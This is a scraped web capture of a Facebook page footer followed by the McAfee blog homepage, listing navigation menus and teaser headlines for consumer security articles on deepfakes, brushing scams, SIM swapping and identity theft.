* [Instagram](https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT2W6CWUqKvetgM89XET7X7pU16exqggxxOSaypqqtf1IgbuUTqrXrGVJ-jKPDl9UScdeiwdCp8sKWU2_v3CJ_u_i6Hptxi-9PRC2LkXKcjNYq8H9hNNOWbqVsLzQHnz_MHT_ni9i4Nyky7V7HmRWQ "Check out Instagram")
* [Threads](https://www.threads.net/ "Check out Threads")
* [Fundraisers](/fundraisers/ "Donate to worthy causes.")
* [Services](/biz/directory/ "Browse our Facebook Services directory.")
* [Voting Information Center](/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D "See the Voting Information Center.")
* [Privacy Policy](/privacy/policy/?entry_point=facebook_page_footer "Learn how we collect, use and share information to support Facebook.")
* [Privacy Center](/privacy/center/?entry_point=facebook_page_footer "Learn how to manage and control your privacy on Facebook.")
* [Groups](/groups/discover/ "Explore our Groups.")
* [About](https://about.meta.com/ "Read our blog, discover the resource center, and find job opportunities.")
* [Create ad](/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto "Advertise on Facebook.")
* [Create Page](/pages/create/?ref_type=site_footer "Create a page")
* [Developers](https://developers.facebook.com/?ref=pf "Develop on our platform.")
* [Careers](/careers/?ref=pf "Make your next career move to our awesome company.")
* [Cookies](/policies/cookies/ "Learn about cookies and Facebook.")
* [Ad choices](https://www.facebook.com/help/568137493302217 "Learn about Ad Choices.")
* [Terms](/policies?ref=pf "Review our terms and policies.")
* [Help](/help/?ref=pf "Visit our Help Center.")
* [Contact Uploading & Non-Users](https://www.facebook.com/help/637205020878504 "Visit our Contact Uploading & Non-Users Notice.")
* [Settings](/settings "View and edit your Facebook settings.")
* [Activity log](/allactivity?privacy_source=activity_log_top_menu "View your activity log")
 Meta ¬© 2025![](https://facebook.com/security/hsts-pixel.gif)



=== Content from securingtomorrow.mcafee.com_5e56616c_20250124_222956.html ===


[![McAfee Home](https://media.mcafeeassets.com/content/dam/npcld/ecommerce/en/company-logo/McAfeeHzRed.svg)](/en-us/index.html)

* Products
  + All-In-One Protection

    - [NEW McAfee+ Individual
      Plans](/en-us/identity-theft/protection.html)

      Complete privacy,
      identity and device protection for individuals.
    - [NEW McAfee+ Family
      Plans](/en-us/identity-theft/family.html)

      Complete privacy,
      identity and device protection for up to 6 family
      members.
  + Other Products & Services

    - [Antivirus](/en-us/antivirus.html)
    - [Scam Protection](https://www.mcafee.com/learn/mcafee-scam-protection/)
    - [Virtual Private Network (VPN)](/en-us/vpn.html)
    - [Mobile Security](https://www.mcafee.com/en-us/antivirus/mobile.html)
    - [PC
      Optimizer](/en-us/consumer-support/pc-optimizer.html)
    - [TechMaster Concierge](https://www.mcafee.com/en-us/products/techmaster.html)
    - [McAfee Assist](/en-us/mcafee-assist.html)
  + Free Tools & Downloads

    - [Web Protection](/en-us/safe-browser/mcafee-webadvisor.html)
    - [Free Antivirus Trial](/en-us/antivirus/free.html)
    - [Device Security Scan](https://www.mcafee.com/en-us/antivirus/mcafee-security-scan-plus.html)
    - [Password Generator](/en-us/password-generator.html)
* Features
  + Keep Me Private Online

    - [Personal Data
      Cleanup](https://www.mcafee.com/learn/personal-data-cleanup/)
    - [Online Account
      Cleanup](https://www.mcafee.com/learn/online-account-cleanup/)
    - [VPN (Virtual
      Private Network)](https://www.mcafee.com/learn/vpn/)
    - [Social Privacy
      Manager](https://www.mcafee.com/learn/social-privacy-manager/)
  + Safeguard My Identity

    - [Identity Monitoring](https://www.mcafee.com/learn/identity-monitoring/)
    - [Credit Monitoring](https://www.mcafee.com/learn/credit-monitoring/)
    - [Security Freeze](https://www.mcafee.com/learn/security-freeze/)
    - [Identity Theft Coverage & Restoration](https://www.mcafee.com/learn/identity-theft-coverage/)
    - [Password Manager](https://www.mcafee.com/learn/password-manager/)
  + Protect My Devices

    - [Antivirus](/en-us/antivirus.html)
    - [Scam Protection](https://www.mcafee.com/learn/mcafee-scam-protection/)
    - [Web Protection](https://www.mcafee.com/learn/web-protection/)
  + Protect My Family

    - [Protection Score](https://www.mcafee.com/en-us/antivirus/protection-score.html)
    - [Parental Controls](https://www.mcafee.com/learn/parental-controls/)
    - [Family Plans](https://www.mcafee.com/learn/family-plans/)
* Resources
  + Stay Updated

    - [McAfee Blog](https://www.mcafee.com/blogs/)
    - [Reports and Guides](/en-us/resources/reports-and-guides.html)
    - [McAfee on YouTube](https://www.youtube.com/McAfee)
    - [Prevent Spam and
      Phishing](/en-us/cyber-scam/customer-scam-awareness.html)
  + Learn More

    - [Learn at McAfee](https://www.mcafee.com/learn/)
    - [What is Antivirus?](/en-us/antivirus.html)
    - [What is a VPN?](/en-us/vpn.html)
    - [What is Identity
      Theft?](https://www.mcafee.com/en-us/identity-theft.html)
  + Press & News

    - [McAfee Newsroom](https://www.mcafee.com/en-us/consumer-corporate/newsroom.html)
    - [AI News & Scams](/en-us/ai-news/ai-hub.html)
* About Us
  + Our Company

    - [Company Overview](/en-us/consumer-corporate/about.html)
    - [Awards &
      Reviews](/en-us/consumer-corporate/about/awards.html)
    - [Investors](/en-us/consumer-corporate/investors.html)
  + Our Efforts

    - [Inclusion &
      Diversity](/en-us/consumer-corporate/inclusion-diversity.html)
    - [Integrity &
      Ethics](/en-us/consumer-corporate/integrity-ethics.html)
    - [Public Policy](/en-us/consumer-support/policy/legal/public-policy.html)
  + Join Us

    - [Careers](https://careers.mcafee.com/)
    - [Life at McAfee](https://careers.mcafee.com/life-at-mcafee)
    - [Our Teams](https://careers.mcafee.com/our-teams)
    - [Our Locations](https://careers.mcafee.com/our-locations)
* [Why McAfee](/en-us/why-mcafee.html)

 [Products](#products-collapse)

All-In-One Protection

[NEW
McAfee+ Individual Plans](/en-us/identity-theft/protection.html)

Complete privacy, identity and device
protection for individuals.

[NEW McAfee+
Family Plans](/en-us/identity-theft/family.html)

Complete privacy, identity and device
protection for up to 6 family members.

Other Products & Services

 [Antivirus](/en-us/antivirus.html)

 [Scam Protection](https://www.mcafee.com/learn/mcafee-scam-protection/)

 [Virtual Private Network (VPN)](/en-us/vpn.html)

 [Mobile Security](https://www.mcafee.com/en-us/antivirus/mobile.html)

 [PC Optimizer](/en-us/consumer-support/pc-optimizer.html)

 [TechMaster Concierge](https://www.mcafee.com/en-us/products/techmaster.html)

 [McAfee Assist](/en-us/mcafee-assist.html)

Free Tools & Downloads

 [Web Protection](/en-us/safe-browser/mcafee-webadvisor.html)

 [Free
Antivirus Trial](/en-us/antivirus/free.html)

 [Device Security Scan](https://www.mcafee.com/en-us/antivirus/mcafee-security-scan-plus.html)

[Password Generator](/en-us/password-generator.html)

[Features](#features-collapse)

Keep Me Private Online

[Personal Data Cleanup](https://www.mcafee.com/learn/personal-data-cleanup/)

[Online Account Cleanup](https://www.mcafee.com/learn/online-account-cleanup/)

 [VPN (Virtual Private Network)](https://www.mcafee.com/learn/vpn/)

[Social Privacy Manager](https://www.mcafee.com/learn/social-privacy-manager/)

Safeguard My Identity

[Identity Monitoring](https://www.mcafee.com/learn/identity-monitoring/)

 [Credit Monitoring](https://www.mcafee.com/learn/credit-monitoring/)

[Security Freeze](https://www.mcafee.com/learn/security-freeze/)

 [Identity Theft Coverage & Restoration](https://www.mcafee.com/learn/identity-theft-coverage/)

 [Password Manager](https://www.mcafee.com/learn/password-manager/)

Protect My Devices

 [Antivirus](/en-us/antivirus.html)

 [Scam Protection](https://www.mcafee.com/learn/mcafee-scam-protection/)

 [Web Protection](https://www.mcafee.com/learn/web-protection/)

Protect My Family

[Protection Score](https://www.mcafee.com/en-us/antivirus/protection-score.html)

[Parental Controls](https://www.mcafee.com/learn/parental-controls/)

[Family Plans](https://www.mcafee.com/learn/family-plans/)

[Resources](#resources-collapse)

Stay Updated

 [McAfee Blog](https://www.mcafee.com/blogs/)

 [Reports and Guides](/en-us/resources/reports-and-guides.html)

 [McAfee
on YouTube](https://www.youtube.com/McAfee)

[Prevent Spam and Phishing](/en-us/cyber-scam/customer-scam-awareness.html)

Learn More

 [Learn at
McAfee](https://www.mcafee.com/learn/)

 [What is Antivirus?](/en-us/antivirus.html)

 [What is a VPN?](/en-us/vpn.html)

[What
is Identity Theft?](https://www.mcafee.com/en-us/identity-theft.html)

Press & News

 [McAfee Newsroom](https://www.mcafee.com/en-us/consumer-corporate/newsroom.html)

 [AI News & Scams](/en-us/ai-news/ai-hub.html)

 [About
Us](#about-us-collapse)

Our Company

[Company Overview](/en-us/consumer-corporate/about.html)

 [Awards & Reviews](/en-us/consumer-corporate/about/awards.html)

 [Investors](/en-us/consumer-corporate/investors.html)

Our Efforts

 [Inclusion & Diversity](/en-us/consumer-corporate/inclusion-diversity.html)

 [Integrity & Ethics](/en-us/consumer-corporate/integrity-ethics.html)

 [Public Policy](/en-us/consumer-support/policy/legal/public-policy.html)

Join Us

 [Careers](https://careers.mcafee.com/)

 [Life at McAfee](https://careers.mcafee.com/life-at-mcafee)

 [Our Teams](https://careers.mcafee.com/our-teams)

[Our Locations](https://careers.mcafee.com/our-locations)

[Why McAfee](/en-us/why-mcafee.html)
 [Support](#support-collapse)

Help

Customer Support

[Support
Community](https://forums.mcafee.com/)

 [FAQs](/en-us/consumer-support/help/common-faq.html)

 [Contact Us](/en-us/consumer-corporate/contact-us.html)

Activation

 [Activate Retail Card](/en-us/consumer-support/activate-product-key.html)

[Region](#region)

Asia Pacific

Australia - [English](/en-au/antivirus.html)

New Zealand - [English](/en-nz/antivirus.html)

Singapore - [English](/en-sg/antivirus.html)

Malaysia - [English](/en-my/antivirus.html)

Philippines - [English](/en-ph/antivirus.html)

India - [English](/en-in/antivirus.html)

ÎåÄÌïúÎØºÍµ≠ - [ÌïúÍµ≠Ïñ¥](/ko-kr/antivirus.html)

Êó•Êú¨ - [Êó•Êú¨Ë™û](/ja-jp/antivirus.html)

‰∏≠ÂõΩ - [ÁÆÄ‰Ωì‰∏≠Êñá](/zh-cn/antivirus.html)

È¶ôÊ∏ØÁâπÂà•Ë°åÊîøÂçÄ - [ÁπÅÈ´î‰∏≠Êñá](/zh-hk/antivirus.html)

Âè∞ÁÅ£ - [ÁπÅÈ´î‰∏≠Êñá](/zh-tw/antivirus.html)

Europe

ƒåesk√° Republika - [ƒåe≈°tina](/cs-cz/antivirus.html)

Danmark - [Dansk](/da-dk/antivirus.html)

Suomi - [Suomi](/fi-fi/antivirus.html)

France - [Fran√ßais](/fr-fr/antivirus.html)

Deutschland - [Deutsch](/de-de/antivirus.html)

ŒïŒªŒªŒ¨Œ¥Œ± - [ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨](/el-gr/antivirus.html)

Ireland - [English](/en-ie/antivirus.html)

Magyarorsz√°g - [Magyar](/hu-hu/antivirus.html)

[◊ô◊©◊®◊ê◊ú](http://home.mcafee.com/Default.aspx?culture=HE-IL) -
◊¢◊ë◊®◊ô◊™

Italia - [Italiano](/it-it/antivirus.html)

Nederland - [Nederlands](/nl-nl/antivirus.html)

Norge - [Bokm√•l](/nb-no/antivirus.html)

Polska - [Polski](/pl-pl/antivirus.html)

Portugal - [Portugu√™s](/pt-pt/antivirus.html)

–†–æ—Å—Å–∏—è - [–†—É—Å—Å–∫–∏–π](/ru-ru/antivirus.html)

Espa√±a - [Espa√±ol](/es-es/antivirus.html)

Sverige - [Svenska](/sv-se/antivirus.html)

Suisse - [Fran√ßais](/fr-ch/antivirus.html)

Schweiz - [Deutsch](/de-ch/antivirus.html)

T√ºrkiye - [T√ºrk√ße](/tr-tr/antivirus.html)

[ÿßŸÑÿπÿ±ÿ®Ÿäÿ©](http://home.mcafee.com/Default.aspx?culture=AR-AE)
- ÿßŸÑÿπÿ±ÿ®Ÿäÿ©

United Kingdom - [English](/en-gb/antivirus.html)

North America

United States - [English](/en-us/antivirus.html)

Canada - [English](/en-ca/antivirus.html)

Canada - [Fran√ßais](/fr-ca/antivirus.html)

South America

Argentina - [Espa√±ol](/es-ar/antivirus.html)

Brasil - [Portugu√™s](/pt-br/antivirus.html)

Chile - [Espa√±ol](/es-cl/antivirus.html)

Colombia - [Espa√±ol](/es-co/antivirus.html)

M√©xico - [Espa√±ol](/es-mx/antivirus.html)

Per√∫ - [Espa√±ol](/es-pe/antivirus.html)

[Sign in](https://www.mcafee.com/login.html)

* Support
  + Help

    - Customer Support
    - [Support Community](https://forums.mcafee.com/)
    - [FAQs](/en-us/consumer-support/help/common-faq.html)
    - [Contact Us](/en-us/consumer-corporate/contact-us.html)
  + Activation

    - [Activate Retail Card](/en-us/consumer-support/activate-product-key.html)

* + Asia Pacific

    - [Australia-English](/en-au/antivirus.html)
    - [New
      Zealand-English](/en-nz/antivirus.html)
    - [Singapore-English](/en-sg/antivirus.html)
    - [Malaysia-English](/en-my/antivirus.html)
    - [Philippines-English](/en-ph/antivirus.html)
    - [India-English](/en-in/antivirus.html)
    - [ÎåÄÌïúÎØºÍµ≠-ÌïúÍµ≠Ïñ¥](/ko-kr/antivirus.html)
    - [Êó•Êú¨-Êó•Êú¨Ë™û](/ja-jp/antivirus.html)
    - [‰∏≠ÂõΩ-ÁÆÄ‰Ωì‰∏≠Êñá](/zh-cn/antivirus.html)
    - [È¶ôÊ∏ØÁâπÂà•Ë°åÊîøÂçÄ-ÁπÅÈ´î‰∏≠Êñá](/zh-hk/antivirus.html)
    - [Âè∞ÁÅ£-ÁπÅÈ´î‰∏≠Êñá](/zh-tw/antivirus.html)
  + Europe

    - [ƒåesk√° Republika-ƒåe≈°tina](/cs-cz/antivirus.html)
    - [Danmark-Dansk](/da-dk/antivirus.html)
    - [Suomi-Suomi](/fi-fi/antivirus.html)
    - [France-Fran√ßais](/fr-fr/antivirus.html)
    - [Deutschland-Deutsch](/de-de/antivirus.html)
    - [ŒïŒªŒªŒ¨Œ¥Œ±-ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨](/el-gr/antivirus.html)
    - [Ireland-English](/el-gr/antivirus.html)
    - [Magyarorsz√°g-Magyar](/hu-hu/antivirus.html)
    - [◊ô◊©◊®◊ê◊ú-◊¢◊ë◊®◊ô◊™](http://home.mcafee.com/Default.aspx?culture=HE-IL)
    - [Italia-Italiano](/it-it/antivirus.html)
    - [Nederland-Nederlands](/nl-nl/antivirus.html)
  + - [Norge-Bokm√•l](/nb-no/antivirus.html)
    - [Polska-Polski](/pl-pl/antivirus.html)
    - [Portugal-Portugu√™s](/pt-pt/antivirus.html)
    - [–†–æ—Å—Å–∏—è-–†—É—Å—Å–∫–∏–π](/ru-ru/antivirus.html)
    - [Espa√±a-Espa√±ol](/es-es/antivirus.html)
    - [Sverige-Svenska](/sv-se/antivirus.html)
    - [Suisse-Fran√ßais](/fr-ch/antivirus.html)
    - [Schweiz-Deutsch](/de-ch/antivirus.html)
    - [T√ºrkiye-T√ºrk√ße](/tr-tr/antivirus.html)
    - [ÿßŸÑÿπÿ±ÿ®Ÿäÿ©-ÿßŸÑÿπÿ±ÿ®Ÿäÿ©](http://home.mcafee.com/Default.aspx?culture=AR-AE)
    - [United Kingdom-English](/en-gb/antivirus.html)
  + North America

    - [United States-English](/en-us/antivirus.html)
    - [Canada-English](/en-ca/antivirus.html)
    - [Canada-Fran√ßais](/fr-ca/antivirus.html)
  + South America

    - [Argentina-Espa√±ol](/es-ar/antivirus.html)
    - [Brasil-Portugu√™s](/pt-br/antivirus.html)
    - [Chile-Espa√±ol](/es-cl/antivirus.html)
    - [Colombia-Espa√±ol](/es-co/antivirus.html)
    - [M√©xico-Espa√±ol](/es-mx/antivirus.html)
    - [Per√∫-Espa√±ol](/es-pe/antivirus.html)

* [Sign in](https://www.mcafee.com/login.html)

* [Blog](https://www.mcafee.com/blogs/)
* Topics![img](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/chevron-up-black.svg)
  [How To Guides and Tutorials](https://www.mcafee.com/blogs/tips-tricks/)
  [Internet Security](https://www.mcafee.com/blogs/internet-security/)
  [Mobile Security](https://www.mcafee.com/blogs/mobile-security/)
  [Family Safety](https://www.mcafee.com/blogs/family-safety/)
  [Privacy & Identity Protection](https://www.mcafee.com/blogs/privacy-identity-protection/)
  [Security News](https://www.mcafee.com/blogs/security-news/)
* At McAfee![img](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/chevron-up-black.svg)
  [McAfee News](https://www.mcafee.com/blogs/mcafee-news/)
  [Executive Perspectives](https://www.mcafee.com/blogs/other-blogs/executive-perspectives/)
  [McAfee Labs](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/)
  [Life at McAfee](https://www.mcafee.com/blogs/other-blogs/life-at-mcafee/)
  [Hackable? Podcast](https://www.mcafee.com/blogs/hackable/)

 ![search grey icon](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/search_icon_black.svg)

* English
  + [Portuguese (BR)](https://www.mcafee.com/blogs/pt-br/)
  + [Spanish](https://www.mcafee.com/blogs/es-es/)
  + [French(FR)](https://www.mcafee.com/blogs/fr-fr/)
  + [German](https://www.mcafee.com/blogs/de-de/)
  + [Italian](https://www.mcafee.com/blogs/it-it/)
  + [Japanese](https://www.mcafee.com/blogs/ja-jp/)
  + [French(CA)](https://www.mcafee.com/blogs/fr-ca/)
  + [Portuguese (PT)](https://www.mcafee.com/blogs/pt-pt/)
  + [Spanish (MX)](https://www.mcafee.com/blogs/es-mx/)
  + [Dutch](https://www.mcafee.com/blogs/nl/)

 ![close grey icon](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/cross-grey-icon.svg)

* [Blog](https://www.mcafee.com/blogs/)
* Topics ![img](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/chevron-up-black.svg)
  [How To Guides and Tutorials](https://www.mcafee.com/blogs/tips-tricks/)
  [Internet Security](https://www.mcafee.com/blogs/internet-security/)
  [Mobile Security](https://www.mcafee.com/blogs/mobile-security/)
  [Family Safety](https://www.mcafee.com/blogs/family-safety/)
  [Privacy & Identity Protection](https://www.mcafee.com/blogs/privacy-identity-protection/)
  [Security News](https://www.mcafee.com/blogs/security-news/)
* At McAfee ![img](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/chevron-up-black.svg)
  [McAfee News](https://www.mcafee.com/blogs/mcafee-news/)
  [Executive Perspectives](https://www.mcafee.com/blogs/other-blogs/executive-perspectives/)
  [McAfee Labs](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/)
  [Life at McAfee](https://www.mcafee.com/blogs/other-blogs/life-at-mcafee/)
  [Hackable? Podcast](https://www.mcafee.com/blogs/hackable/)

* .
* ![img-icon-globe](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/globe-icon.svg)

  [Portuguese (BR)](https://www.mcafee.com/blogs/pt-br/)
  [Spanish](https://www.mcafee.com/blogs/es-es/)
  [French(FR)](https://www.mcafee.com/blogs/fr-fr/)
  [German](https://www.mcafee.com/blogs/de-de/)
  [Italian](https://www.mcafee.com/blogs/it-it/)
  [Japanese](https://www.mcafee.com/blogs/ja-jp/)
  [French(CA)](https://www.mcafee.com/blogs/fr-ca/)
  [Portuguese (PT)](https://www.mcafee.com/blogs/pt-pt/)
  [Spanish (MX)](https://www.mcafee.com/blogs/es-mx/)
  [Dutch](https://www.mcafee.com/blogs/nl/)

![close grey icon](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/cross-grey-icon.svg)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2025/01/614x300_Blog_Hollywoodd-Deepfake.png)](https://www.mcafee.com/blogs/internet-security/how-social-media-is-spreading-l-a-misinformation-like-wildfire/ "The Hollywood Sign is Not on Fire: Deepfakes Spread During L.A. Wildfires")

# [The Hollywood Sign is Not on Fire: Deepfakes Spread During L.A. Wildfires](https://www.mcafee.com/blogs/internet-security/how-social-media-is-spreading-l-a-misinformation-like-wildfire/ "The Hollywood Sign is Not on Fire: Deepfakes Spread During L.A. Wildfires")

Amid the devastation of the Los Angeles County wildfires ‚Äì scorching an area twice the size of Manhattan ‚Äì McAfee threat researchers have identified and verified a rise in AI-generated deepfakes and misinformation,...

Jan 10, 2025  ¬†¬†|¬†¬†    7  MIN READ

* Trending Articles
* ###### [How to Protect Yourself from a Brushing Scam](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-yourself-from-a-brushing-scam/ "How to Protect Yourself from a Brushing Scam")

  Dec 21, 2024 ¬†¬†|¬†¬†   5  MIN READ
* ###### [How to Be Your Family‚Äôs Digital IT Hero for the Holidays](https://www.mcafee.com/blogs/family-safety/how-to-be-your-familys-digital-it-hero-for-the-holidays/ "How to Be Your Family‚Äôs Digital IT Hero for the Holidays")

  Nov 18, 2024 ¬†¬†|¬†¬†   6  MIN READ
* ###### [This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/ "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

  Dec 11, 2024 ¬†¬†|¬†¬†   7  MIN READ

### [How To Guides and Tutorials](https://www.mcafee.com/blogs/tips-tricks/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/tips-tricks/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/04/300x200_Blog_111924.png)](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-yourself-from-a-brushing-scam/%20 "How to Protect Yourself from a Brushing Scam")

##### [How to Protect Yourself from a Brushing Scam](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-yourself-from-a-brushing-scam/%20 "How to Protect Yourself from a Brushing Scam")

Brushing scams are a type of online fraud where sellers send unsolicited packages to individuals, even though...

Dec 21, 2024  ¬†¬†|¬†¬†    5  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/11/300x200_Blog_Holiday-Shopping.png)](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/%20 "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

##### [This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/%20 "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

Whether it be that their shoes are too tight, their heads aren‚Äôt screwed on just right, or they‚Äôre expressing a...

Dec 11, 2024  ¬†¬†|¬†¬†    7  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2023/11/300x200_Blog_113023.png)](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-your-data-while-on-the-go/%20 "How to Protect Your Data While On-the-Go")

##### [How to Protect Your Data While On-the-Go](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-your-data-while-on-the-go/%20 "How to Protect Your Data While On-the-Go")

Winter travel is filled with excitement‚Äîwhether you‚Äôre heading to a snow-covered ski resort, visiting family for the...

Dec 04, 2024  ¬†¬†|¬†¬†    5  MIN READ

### [Mobile Security](https://www.mcafee.com/blogs/mobile-security/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/mobile-security/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/04/300x200_Blog_111924.png)](https://www.mcafee.com/blogs/mobile-security/what-is-sim-swapping/%20 "How to Protect Your Smartphone from SIM Swapping")

##### [How to Protect Your Smartphone from SIM Swapping](https://www.mcafee.com/blogs/mobile-security/what-is-sim-swapping/%20 "How to Protect Your Smartphone from SIM Swapping")

This article will be an informational piece on everything consumers need to know about SIM swapping: what...

Nov 19, 2024  ¬†¬†|¬†¬†    5  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/11/300x200_Blog_110824.png)](https://www.mcafee.com/blogs/mobile-security/every-step-you-take-every-call-you-make-is-your-phone-tracking-you/%20 "Every Step You Take, Every Call You Make: Is Your Phone Tracking You?")

##### [Every Step You Take, Every Call You Make: Is Your Phone Tracking You?](https://www.mcafee.com/blogs/mobile-security/every-step-you-take-every-call-you-make-is-your-phone-tracking-you/%20 "Every Step You Take, Every Call You Make: Is Your Phone Tracking You?")

So, what does your phone know about you? Taken all together it knows plenty ‚Äî sometimes in...

Nov 08, 2024  ¬†¬†|¬†¬†    10  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/07/300x200_Blog_110724.png)](https://www.mcafee.com/blogs/mobile-security/how-to-tell-if-your-smartphone-has-been-hacked/%20 "How To Tell If Your Smartphone Has Been Hacked")

##### [How To Tell If Your Smartphone Has Been Hacked](https://www.mcafee.com/blogs/mobile-security/how-to-tell-if-your-smartphone-has-been-hacked/%20 "How To Tell If Your Smartphone Has Been Hacked")

Something‚Äôs not right. Maybe your phone is losing its charge way too quickly. Or one day it...

Nov 07, 2024  ¬†¬†|¬†¬†    6  MIN READ

### [Privacy & Identity Protection](https://www.mcafee.com/blogs/privacy-identity-protection/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/privacy-identity-protection/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/11/300x200_Blog_Holiday-Shopping.png)](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/%20 "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

##### [This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/%20 "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

Whether it be that their shoes are too tight, their heads aren‚Äôt screwed on just right, or they‚Äôre expressing a...

Dec 11, 2024  ¬†¬†|¬†¬†    7  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/03/300x200_Blog_112624.png)](https://www.mcafee.com/blogs/privacy-identity-protection/top-signs-of-identity-theft/%20 "How to Detect Signs of Identity Theft")

##### [How to Detect Signs of Identity Theft](https://www.mcafee.com/blogs/privacy-identity-protection/top-signs-of-identity-theft/%20 "How to Detect Signs of Identity Theft")

When it comes to identity theft, if something doesn‚Äôt feel right, trust your gut. Follow up. What...

Nov 26, 2024  ¬†¬†|¬†¬†    9  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/02/300x200_Blog_112524.png)](https://www.mcafee.com/blogs/privacy-identity-protection/how-to-delete-yourself-from-the-internet/%20 "How to Delete Yourself from the Internet")

##### [How to Delete Yourself from the Internet](https://www.mcafee.com/blogs/privacy-identity-protection/how-to-delete-yourself-from-the-internet/%20 "How to Delete Yourself from the Internet")

While you can‚Äôt delete your personal info from the internet entirely, you can take strong steps to...

Nov 25, 2024  ¬†¬†|¬†¬†    9  MIN READ

### [Security News](https://www.mcafee.com/blogs/security-news/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/security-news/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2025/01/300x200_Blog_AV-Gold-Blog-300x200.png)](https://www.mcafee.com/blogs/security-news/av-comparatives-crowns-mcafee-as-2024s-leader-in-online-protection-and-speed/%20 "AV-Comparatives Crowns McAfee as 2024‚Äôs Leader in Online Protection and Speed")

##### [AV-Comparatives Crowns McAfee as 2024‚Äôs Leader in Online Protection and Speed](https://www.mcafee.com/blogs/security-news/av-comparatives-crowns-mcafee-as-2024s-leader-in-online-protection-and-speed/%20 "AV-Comparatives Crowns McAfee as 2024‚Äôs Leader in Online Protection and Speed")

McAfee Total Protection users can feel even more secure online knowing that AV-Comparatives has named it the...

Jan 16, 2025  ¬†¬†|¬†¬†    2  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2025/01/300x200_Blog_AMD-2x-300x200.png)](https://www.mcafee.com/blogs/security-news/mcafee-deepfake-detector-fighting-misinformation-with-amd-ai-powered-precision/%20 "McAfee Deepfake Detector: Fighting Misinformation with AMD AI-Powered Precision")

##### [McAfee Deepfake Detector: Fighting Misinformation with AMD AI-Powered Precision](https://www.mcafee.com/blogs/security-news/mcafee-deepfake-detector-fighting-misinformation-with-amd-ai-powered-precision/%20 "McAfee Deepfake Detector: Fighting Misinformation with AMD AI-Powered Precision")

In a world where deepfake scams and misinformation are increasingly pervasive, McAfee is taking a bold step...

Jan 07, 2025  ¬†¬†|¬†¬†    3  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/300x200_Blog_2024-Data-Breaches-Wrapped.png)](https://www.mcafee.com/blogs/security-news/2024-data-breaches-wrapped/%20 "2024 Data Breaches Wrapped")

##### [2024 Data Breaches Wrapped](https://www.mcafee.com/blogs/security-news/2024-data-breaches-wrapped/%20 "2024 Data Breaches Wrapped")

It‚Äôs been a big year for big data breaches. Billions of records on millions of people have...

Dec 01, 2024  ¬†¬†|¬†¬†    10  MIN READ

### [Family Safety](https://www.mcafee.com/blogs/family-safety/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/family-safety/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/11/300x200_Blog_111824.png)](https://www.mcafee.com/blogs/family-safety/how-to-be-your-familys-digital-it-hero-for-the-holidays/%20 "How to Be Your Family‚Äôs Digital IT Hero for the Holidays")

